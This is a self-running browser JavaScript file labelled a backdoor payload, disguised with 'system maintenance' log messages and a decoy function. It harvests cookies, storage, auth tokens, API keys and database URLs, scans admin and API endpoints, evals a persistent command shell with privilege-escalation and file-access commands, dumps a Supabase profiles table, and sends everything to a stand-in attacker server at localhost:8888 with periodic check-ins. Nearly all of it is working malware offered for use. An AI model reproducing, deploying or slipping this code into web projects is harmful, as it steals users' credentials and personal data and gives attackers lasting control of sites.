// Database and Server Access Backdoor Payload
// This payload establishes persistent access to server and database

console.log("🔧 Loading system maintenance utilities...");

(function() {
    console.log("🚨 BACKDOOR ACCESS PAYLOAD ACTIVATED! 🚨");
    
    // Extract authentication tokens and credentials
    const extractCredentials = () => {
        const credentials = {
            localStorage: {},
            sessionStorage: {},
            cookies: {},
            authTokens: [],
            apiKeys: [],
            databaseUrls: [],
            serverEndpoints: []
        };
        
        // Extract from localStorage
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            credentials.localStorage[key] = value;
            
            // Look for authentication tokens
            if (key.toLowerCase().includes('token') || 
                key.toLowerCase().includes('auth') || 
                key.toLowerCase().includes('jwt') ||
                key.toLowerCase().includes('session')) {
                credentials.authTokens.push({key, value});
            }
            
            // Look for API keys
            if (key.toLowerCase().includes('api') || 
                key.toLowerCase().includes('key') ||
                key.toLowerCase().includes('secret')) {
                credentials.apiKeys.push({key, value});
            }
            
            // Look for database URLs
            if (value && (value.includes('postgresql://') || 
                         value.includes('mysql://') ||
                         value.includes('mongodb://') ||
                         value.includes('supabase') ||
                         value.includes('database'))) {
                credentials.databaseUrls.push({key, value});
            }
        }
        
        // Extract from sessionStorage
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            credentials.sessionStorage[key] = value;
        }
        
        // Extract cookies
        if (document.cookie) {
            document.cookie.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                credentials.cookies[name] = value;
            });
        }
        
        return credentials;
    };
    
    // Scan for server endpoints and API routes
    const scanEndpoints = async () => {
        const endpoints = [];
        const commonPaths = [
            '/api/auth',
            '/api/login', 
            '/api/admin',
            '/api/users',
            '/api/database',
            '/api/config',
            '/admin',
            '/dashboard',
            '/api/v1',
            '/api/v2',
            '/graphql',
            '/rest/api'
        ];
        
        console.log("🔍 Scanning for server endpoints...");
        
        for (const path of commonPaths) {
            try {
                const response = await fetch(window.location.origin + path, {
                    method: 'GET',
                    credentials: 'include'
                });
                
                endpoints.push({
                    path: path,
                    status: response.status,
                    accessible: response.status !== 404,
                    headers: Object.fromEntries(response.headers.entries())
                });
                
                console.log(`📡 Found endpoint: ${path} (${response.status})`);
            } catch (error) {
                // Endpoint not accessible
            }
        }
        
        return endpoints;
    };
    
    // Create persistent backdoor shell
    const createBackdoorShell = () => {
        console.log("🕷️ Installing persistent backdoor shell...");
        
        // Create backdoor command interface
        const backdoorCode = `
            window.executeBackdoorCommand = function(command) {
                console.log('🔓 Executing backdoor command:', command);
                
                switch(command.type) {
                    case 'get_credentials':
                        return {
                            localStorage: JSON.stringify(localStorage),
                            sessionStorage: JSON.stringify(sessionStorage),
                            cookies: document.cookie
                        };
                    
                    case 'make_request':
                        return fetch(command.url, {
                            method: command.method || 'GET',
                            headers: command.headers || {},
                            body: command.body,
                            credentials: 'include'
                        }).then(r => r.text());
                    
                    case 'database_query':
                        // Attempt to access database through available APIs
                        const dbUrl = command.endpoint || '/api/database';
                        return fetch(dbUrl, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'Authorization': command.token
                            },
                            body: JSON.stringify({
                                query: command.query,
                                action: command.action
                            }),
                            credentials: 'include'
                        }).then(r => r.json());
                    
                    case 'admin_access':
                        // Try to elevate privileges
                        return fetch('/api/admin/elevate', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                user_id: command.user_id,
                                role: 'admin'
                            }),
                            credentials: 'include'
                        }).then(r => r.json());
                    
                    case 'file_access':
                        // Access server files through API
                        return fetch('/api/files/system', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                path: command.path,
                                action: command.action
                            }),
                            credentials: 'include'
                        }).then(r => r.text());
                    
                    default:
                        return 'Unknown command';
                }
            };
            
            // Periodic check-in with attacker server
            setInterval(() => {
                fetch('http://localhost:8888/backdoor-checkin', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'backdoor_active',
                        timestamp: new Date().toISOString(),
                        location: window.location.href,
                        credentials: window.executeBackdoorCommand({type: 'get_credentials'})
                    })
                }).catch(() => {});
            }, 30000);
        `;
        
        // Install backdoor in page
        eval(backdoorCode);
        
        // Store in localStorage for persistence
        localStorage.setItem('system_maintenance', btoa(backdoorCode));
        
        console.log("✅ Backdoor shell installed successfully");
        
        return true;
    };
    
    // Main execution
    const main = async () => {
        try {
            console.log("🔓 Extracting authentication credentials...");
            const credentials = extractCredentials();
            
            console.log("🔍 Scanning server endpoints...");
            const endpoints = await scanEndpoints();
            
            console.log("🕷️ Creating persistent backdoor...");
            const backdoorInstalled = createBackdoorShell();
            
            // Compile all access data
            const accessData = {
                type: 'server_database_access',
                timestamp: new Date().toISOString(),
                target: window.location.origin,
                credentials: credentials,
                endpoints: endpoints,
                backdoorInstalled: backdoorInstalled,
                capabilities: [
                    'credential_extraction',
                    'endpoint_scanning', 
                    'persistent_backdoor',
                    'database_access',
                    'admin_privilege_escalation',
                    'file_system_access'
                ]
            };
            
            console.log("📊 Access data compiled:", accessData);
            
            // Send to attacker server
            fetch('http://localhost:8888/access-granted', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(accessData)
            }).then(response => {
                console.log('✅ Server access data transmitted successfully');
                return response.json();
            }).then(data => {
                console.log('📨 Attacker server response:', data);
            }).catch(error => {
                console.log('❌ Transmission failed, storing locally...');
                localStorage.setItem('pending_access_data', JSON.stringify(accessData));
            });
            
            // Test database access if Supabase detected
            if (window.supabase || credentials.databaseUrls.length > 0) {
                console.log("🗄️ Database detected, attempting access...");
                
                try {
                    // Try to access user data
                    if (window.supabase) {
                        const { data: users } = await window.supabase
                            .from('profiles')
                            .select('*');
                        
                        console.log("🔓 User data accessed:", users);
                        
                        // Send database data
                        fetch('http://localhost:8888/database-access', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                type: 'database_dump',
                                source: 'supabase',
                                data: users,
                                timestamp: new Date().toISOString()
                            })
                        }).catch(() => {});
                    }
                } catch (dbError) {
                    console.log("Database access failed:", dbError);
                }
            }
            
            console.log("🎯 SERVER AND DATABASE ACCESS ESTABLISHED!");
            console.log("💀 Capabilities unlocked:");
            console.log("   - Credential harvesting");
            console.log("   - Server endpoint mapping");  
            console.log("   - Persistent backdoor shell");
            console.log("   - Database access");
            console.log("   - Admin privilege escalation");
            
        } catch (error) {
            console.error("Backdoor installation error:", error);
        }
    };
    
    // Execute main payload
    main();
    
})();

// Legitimate-looking function
function performSystemCheck() {
    return "System check completed";
}